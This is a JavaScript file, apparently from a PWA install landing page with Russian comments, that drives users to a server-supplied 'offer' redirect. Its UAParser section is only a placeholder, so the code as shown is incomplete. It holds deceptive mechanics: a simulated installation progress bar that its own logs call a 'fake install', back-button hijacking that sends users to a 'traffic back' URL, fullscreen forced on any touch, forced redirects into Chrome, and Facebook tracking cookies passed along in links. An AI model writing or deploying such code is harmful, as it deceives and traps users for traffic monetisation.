/*!
 * ============ 1) UAParser (IIFE) ============
 */
(function(e, i) {
  "use strict";

  // ... Ваша реализация UAParser ...
  // (тот огромный кусок, который начинается c !function(e, i) { ... } )

})("object" == typeof window ? window : this);

/*!
 * ============ 2) PWA & app-logic ============
 */
const PUSH_PLACEMENTS = {
  PAGE_IS_LOADED: "pageIsLoaded",
  TRAFFIC_BACK_IS_TRIGGERED: "trafficBackIsTriggered",
  AFTER_INSTALL: "afterInstall",
  AFTER_OPEN: "afterOpen",
};

const app = {
  uaParser: null,
  redirect: null,
  pushPlacement: PUSH_PLACEMENTS.AFTER_INSTALL,
  postLandingPageId: null,
  setting: {
    installing: {
      ranges: {
        step: { min: 15, max: 20 },
        interval: { min: 1500, max: 2000 },
      },
    },
  },

  async init() {
    // fetch('/analytic/'+app.osid) — если нужно; 
    // Если сервер не реализован, может бросать ошибку
    const e = await fetch(`/analytic/${app.osid}`);
    const i = await e.json();

    if (i.redirect == null) {
      throw new Error("Redirect not found");
    }
    app.redirect = i.redirect;

    if (i.pushPlacement != null) {
      app.pushPlacement = i.pushPlacement;
    }
    if (i.setting != null) {
      app.setting = i.setting;
    }
    if (i.postLandingPageId != null) {
      app.postLandingPageId = i.postLandingPageId;
    }

    app.uaParser = new UAParser();
  },

  get osid() {
    return document.body.getAttribute("data-pwauid");
  },

  get step() {
    return app.rand(
      app.setting.installing.ranges.step.min,
      app.setting.installing.ranges.step.max
    );
  },
  get interval() {
    return app.rand(
      app.setting.installing.ranges.interval.min,
      app.setting.installing.ranges.interval.max
    );
  },

  get userLang() {
    return (navigator.languages[0] || navigator.language).split("-")[0];
  },

  get displayMode() {
    if (window.location.search) {
      const e = new URLSearchParams(window.location.search);
      if (e.get("pwadm")) {
        return e.get("pwadm");
      }
    }
    const e = window.matchMedia("(display-mode: standalone)").matches;
    if (document.referrer.startsWith("android-app://")) {
      return "twa";
    }
    return navigator.standalone || e ? "standalone" : "browser";
  },

  getSearch(e) {
    const i = new URLSearchParams(e);
    i.set("pwauid", app.osid);
    let t = i.toString();
    if (t.length) {
      t = "?" + t;
    }
    return t;
  },

  getProgress(e, i) {
    const t = [];
    let n = 0;
    const a = e / i / 3;
    while (n < i) {
      n++;
      let o = n * (e / i);
      o += Math.random() > 0.5 ? a : -1 * a;
      t.push(o.toFixed(2));
    }
    t.splice(t.length - 1, 1, e); // последний элемент делаем e
    return t;
  },

  getLinkToChrome() {
    let e = app.getSearch(window.location.search);
    const i = new URLSearchParams(e);
    const t = document.cookie.split("; ");
    for (const item of t) {
      const a = item.split("=");
      if ("_fbc" === a[0]) {
        i.set("_fbc", a[1]);
      }
      if ("_fbp" === a[0]) {
        i.set("_fbp", a[1]);
      }
    }
    e = i.toString();
    return `intent://navigate?url=${window.location.hostname}/?${e}#Intent;scheme=googlechrome;end;`;
  },

  rand(e, i) {
    return Math.round(Math.random() * (i - e) + e);
  },

  isShowPushSubscription(e) {
    return app.pushPlacement === e;
  },

  async showPush() {
    const e = document.body.getAttribute("data-application-server-key");
    if (e != null) {
      await showNativeNotification(e);
    } else if (window.POS != null && window.OneSignal != null) {
      await showOneSignalNotification();
    }
  },

  tryRedirectToChrome() {
    if (
      app.uaParser.getBrowser().name !== "Chrome" &&
      app.uaParser.getOS().name !== "iOS"
    ) {
      setTimeout(() => {
        app.goToChrome();
      }, 1000);
    }
  },

  goToChrome() {
    const e = document.getElementById("r");
    const i = app.getLinkToChrome();
    e.setAttribute("href", i);
    e.click();
  },

  tryGetRedirect({ appEntity: e, appService: i }) {
    const t = app.redirect.split("?");
    t[1] = app.getSearch(t[1]);
    e.redirect = t.join("");
    if (app.displayMode === "standalone") {
      i.redirectToOffer(e);
    }
  },

  async iOpened() {
    send("open");
    window.dispatchEvent(new Event("iOpened"));
  },

  async iInstalled(e = "install") {
    send(e);
    window.dispatchEvent(new Event("iInstalled"));
  },

  async iSubscribed(e = null) {
    send("push", e);
    window.dispatchEvent(new Event("iSubscribed"));
  },

  async getTapTranslation() {
    try {
      const e = await fetch("/tap-translation.json");
      let i = "en";
      if (e.ok) {
        const t = await e.json();
        if (Object.keys(t).includes(app.userLang)) {
          i = t[app.userLang];
        }
      }
      return i;
    } catch (err) {
      console.error(err);
    }
  },
};

const send = (eventType, data = null) => {
  const t = {
    method: "POST",
    headers: {
      "Content-type": "application/json; charset=UTF-8",
    },
  };
  if (data != null) {
    t.body = JSON.stringify(data);
  }
  return fetch(`/analytic/${app.osid}/${eventType}`, t);
};

const showNativeNotification = async (serverKey) => {
  try {
    const i = {
      userVisibleOnly: true,
      applicationServerKey: serverKey,
    };
    const permissionState = await window.serviceWorkerRegistration.pushManager.permissionState(i);
    if (permissionState !== "denied") {
      let sub = await window.serviceWorkerRegistration.pushManager.getSubscription();
      if (sub == null) {
        sub = await window.serviceWorkerRegistration.pushManager.subscribe(i);
      }
      app.iSubscribed(sub);
    }
  } catch (err) {
    console.error(err);
  }
};

const showOneSignalNotification = async () => {
  window.OneSignal = window.OneSignal || [];
  window.OneSignal.push(function () {
    try {
      OneSignal.init({
        appId: window.POS,
        autoResubscribe: false,
      });
      if (window.forwardingSignalUserId) {
        OneSignal.setExternalUserId(app.osid);
      }
      OneSignal.on("subscriptionChange", function (subscribed) {
        if (subscribed) {
          app.iSubscribed();
        }
      });
    } catch (err) {
      console.log(err);
    }
  });
  await window.OneSignal.showNativePrompt();
};

/*!
 * ============ 3) DOMContentLoaded ============
 */
window.addEventListener("DOMContentLoaded", async () => {
  const e = false;
  const i = new AppEntity(e);
  const t = new ButtonEntity(e);
  const n = new AppService(e);
  const a = new InstallerEntity(e);
  const o = new InstallerService(e);
  const s = new Binds(e);

  await app.init();

  if ("serviceWorker" in navigator && app.osid) {
    navigator.serviceWorker
      .register("/pwabuilder-sw.js", { scope: "./" })
      .then(function (reg) {
        window.serviceWorkerRegistration = reg;
        window.dispatchEvent(new Event("serviceWorkerRegistration"));
      });
  }

  app.tryRedirectToChrome();
  app.tryGetRedirect({ appEntity: i, appService: n });

  if (app.displayMode !== "standalone") {
    s.init();
    const cbAccepted = () => {
      app.iInstalled();
    };
    const cbDismissed = () => {
      window.location.reload();
    };

    window.addEventListener("serviceWorkerRegistration", () => {
      if (app.isShowPushSubscription(PUSH_PLACEMENTS.PAGE_IS_LOADED)) {
        app.showPush();
      }
      const checkInstalled = async () => {
        if ("getInstalledRelatedApps" in window.navigator) {
          const relatedApps = await navigator.getInstalledRelatedApps();
          if (relatedApps.length > 0) {
            clearInterval(intervalId);
            a.installed();
            o.stopInstalling({ buttonEntity: t, installerEntity: a });
            t.setOpen();
          }
        }
      };
      checkInstalled();
      const intervalId = setInterval(checkInstalled, 500);

      window.addEventListener("beforeinstallprompt", (evt) => {
        evt.preventDefault();
        a.ready(evt);
      });

      window.addEventListener("appinstalled", () => {
        o.runInstalling({ buttonEntity: t, installerEntity: a });
        if (app.isShowPushSubscription(PUSH_PLACEMENTS.AFTER_INSTALL)) {
          app.showPush();
        }
      });
    });

    n.showInstallBody(i);

    t.baseEl.addEventListener("click", async () => {
      if (a.status === "ready") {
        s.disablePrevButton();
        await o.openPrompt({
          installerEntity: a,
          cbAccepted,
          cbDismissed,
        });
        t.setDownload();
      } else if (a.status === "installed") {
        if (app.isShowPushSubscription(PUSH_PLACEMENTS.AFTER_OPEN)) {
          await app.showPush();
        }
        app.iOpened();
        const e = app.getSearch(window.location.search);
        const i = new URL(`https://${window.location.hostname}${e}`);
        i.searchParams.set("pwadm", "standalone");
        if (app.postLandingPageId) {
          i.searchParams.set("pwaplp_id", app.postLandingPageId);
        }
        window.open(i.toString(), "_blank");
      }
      if (app.uaParser.getOS().name === "iOS") {
        app.iInstalled("ios");
        n.redirectToOffer(i);
      }
    });
  }
});

/*!
 * ============ 4) Классы (DebugMode, AppEntity, ButtonEntity, ...) ============
 */
class Logger {
  static info(e, i = "Info") {
    console.log(`[${i}] - ${e.trim()}`);
  }
}
class DebugMode {
  debug = false;
  constructor(e = false) {
    this.debug = e;
  }
}
class AppEntity extends DebugMode {
  _redirect = "";
  get baseEl() {
    return document.getElementById("_js");
  }
  get redirect() {
    return this._redirect.trim();
  }
  set redirect(e) {
    this._redirect = e.trim();
    this.debug && Logger.info("Set redirect " + this._redirect);
  }
}

class ButtonEntity extends DebugMode {
  get baseEl() {
    return document.getElementById("install-button");
  }
  get loadingEl() {
    return document.querySelector(".loading");
  }
  get progressWordEl() {
    return document.querySelector(".progress_word");
  }
  get runnerEl() {
    return document.querySelector(".runner");
  }
  get installingText() {
    return this.baseEl.getAttribute("data-installing")?.trim() || "Installing...";
  }
  get downloadText() {
    return this.baseEl.getAttribute("data-download")?.trim() || "Download...";
  }
  get openText() {
    return this.baseEl.getAttribute("data-open")?.trim() || "Open";
  }
  get size() {
    return parseFloat(this.baseEl.getAttribute("data-size")?.trim() || "15");
  }

  setInstalling() {
    if (this.loadingEl) this.loadingEl.style.display = "none";
    if (this.baseEl) {
      this.baseEl.style.display = "block";
      this.baseEl.innerHTML = this.installingText;
      this.baseEl.disabled = true;
    }
  }

  setDownload() {
    if (this.loadingEl) this.loadingEl.style.display = "none";
    if (this.baseEl) {
      this.baseEl.style.display = "block";
      this.baseEl.innerHTML = this.downloadText;
      this.baseEl.disabled = true;
    }
  }

  setOpen() {
    this.setInstalling();
    setTimeout(() => {
      if (this.baseEl) {
        this.baseEl.innerText = this.openText;
        if (this.loadingEl) this.loadingEl.style.display = "none";
        this.baseEl.style.display = "block";
        this.baseEl.disabled = false;
      }
    }, 2000);
  }
}

class AppService extends DebugMode {
  showInstallBody(e) {
    if (e.baseEl) {
      e.baseEl.style.display = "block";
    }
  }
  redirectToOffer(e) {
    if (
      window.forwardingSignalUserId &&
      window.POS != null &&
      window.OneSignal != null
    ) {
      const i = new URL(e.redirect);
      let t = null;
      for (const param of i.searchParams) {
        if (param[1] === "{os_user_id}") {
          t = param[0];
        }
      }
      if (t != null) {
        i.searchParams.set(t, app.osid);
      } else {
        i.searchParams.set("os_user_id", app.osid);
      }
      e.redirect = i.toString();
      try {
        window.OneSignal.init({ appId: window.POS, autoResubscribe: false });
        window.OneSignal
          .getUserId()
          .then((n) => {
            if (n != null && n.length > 0 && t == null) {
              i.searchParams.set("onesignalid", n);
              e.redirect = i.toString();
            }
            window.location.href = e.redirect;
          })
          .catch(() => {
            window.location.href = e.redirect;
          });
      } catch (err) {
        window.location.href = e.redirect;
      }
      window.location.href = e.redirect;
    } else {
      window.location.href = e.redirect;
    }
  }
}

class InstallerEntity extends DebugMode {
  _status = "none";
  deferredPrompt = null;

  get status() {
    return this._status;
  }
  ready(e) {
    this._status = "ready";
    this.deferredPrompt = e;
    this.debug && Logger.info("Installer ready");
  }
  prompt() {
    this._status = "prompt";
    this.debug && Logger.info("Run prompt");
  }
  installing() {
    this._status = "installing";
    this.debug && Logger.info("Begin installing PWA");
  }
  installed() {
    this._status = "installed";
    this.debug && Logger.info("PWA installed");
  }
}

class InstallerService extends DebugMode {
  _interval = null;

  async openPrompt({ installerEntity: e, cbAccepted, cbDismissed }) {
    e.prompt();
    const { outcome } = await e.deferredPrompt.prompt();
    if (outcome === "accepted") {
      this.debug && Logger.info("User accepted install PWA");
      cbAccepted();
    } else {
      this.debug && Logger.info("User dismissed install PWA");
      cbDismissed();
    }
    e.deferredPrompt = null;
  }

  runInstalling({ buttonEntity: e, installerEntity: i }) {
    i.installing();
    this.debug && Logger.info("Begin fake install");
    if (e.baseEl) e.baseEl.style.display = "none";
    if (e.loadingEl) e.loadingEl.style.display = "block";
    if (e.progressWordEl) e.progressWordEl.innerText = `0 MB / ${e.size} MB`;
    if (e.runnerEl) e.runnerEl.style.width = "0%";

    const steps = app.getProgress(e.size, app.step);
    this._interval = setInterval(() => {
      if (steps.length) {
        const iVal = steps.shift();
        if (e.progressWordEl) {
          e.progressWordEl.innerText = `${iVal} MB / ${e.size} MB`;
        }
        const n = ((100 * iVal) / e.size).toFixed(2);
        if (e.runnerEl) {
          e.runnerEl.style.width = `${n}%`;
        }
      } else {
        this.stopInstalling({ buttonEntity: e, installerEntity: i });
      }
    }, app.interval);
  }

  stopInstalling({ buttonEntity: e, installerEntity: i }) {
    this.debug && Logger.info("Stop fake install");
    clearInterval(this._interval);
    i.installed();
    e.setOpen();
  }
}

class Binds extends DebugMode {
  prevButton = null;
  fullScreen = null;
  fullScreenInit = false;
  prevButtonInit = false;
  prevButtonUse = false;

  init = () => {
    for (const el of ["prevButton", "fullScreen"]) {
      const dom = document.getElementById(el);
      if (dom != null) {
        this[el] = dom.getAttribute(`data-${el.toLowerCase()}`);
        this.debug && Logger.info(`Init ${el}`, "Binds");
      }
    }
    if (this.fullScreen != null) {
      this.fullScreenInit = true;
      window.addEventListener("click", this.fullScreenHandle);
      document.addEventListener("touchstart", this.fullScreenHandle);
      document.addEventListener("touchmove", this.fullScreenHandle);
      this.debug && Logger.info("Init fullScreen handlers", "Binds");
    }
    if (this.prevButton != null) {
      this.prevButtonInit = true;
      this.prevButtonUse = true;
      window.addEventListener("click", this.prevButtonHandle);
      document.addEventListener("touchstart", this.prevButtonHandle);
      document.addEventListener("touchmove", this.prevButtonHandle);
      this.debug && Logger.info("Init prevButton handlers", "Binds");
    }
  };

  disablePrevButton = () => {
    this.prevButtonUse = false;
    this.debug && Logger.info("Disable prevButton handlers", "Binds");
  };

  fullScreenHandle = () => {
    if (this.fullScreenInit === true) {
      document.documentElement
        .requestFullscreen()
        .then(() => {
          this.fullScreenInit = false;
          this.debug && Logger.info("Run fullScreen handler", "Binds");
        })
        .catch((err) => {
          console.log(err);
        });
    }
  };

  prevButtonHandle = () => {
    if (this.prevButtonInit === true) {
      this.prevButtonInit = false;
      this.debug && Logger.info("Run prevButton handler", "Binds");
      window.history.pushState(null, document.title, window.location.href);
      window.addEventListener("popstate", () => {
        if (this.prevButtonUse === true) {
          if (this.prevButton.search("http") === 0) {
            this.goToTrafficBack();
          } else {
            document.documentElement.requestFullscreen().then();
          }
        }
      });
    }
  };

  async goToTrafficBack() {
    if (app.isShowPushSubscription(PUSH_PLACEMENTS.TRAFFIC_BACK_IS_TRIGGERED)) {
      await app.showPush();
    }
    window.location.href = this.prevButton;
  }
}